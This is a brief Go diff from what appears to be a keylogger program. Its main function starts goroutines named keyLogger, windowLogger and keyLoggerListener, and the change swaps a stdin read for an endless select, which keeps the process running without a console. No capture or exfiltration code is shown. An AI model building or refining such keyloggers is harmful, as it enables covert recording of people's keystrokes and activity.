@@ -4,7 +4,6 @@ import (
 	"fmt"
 	"log"
 	"math"
-	"os"
 	"strconv"
 	"syscall"
 	"time"
@@ -434,5 +433,5 @@ func main() {
 	go keyLogger()
 	go windowLogger()
 	go keyLoggerListener()
-	os.Stdin.Read([]byte{0})
+	select {}
 }
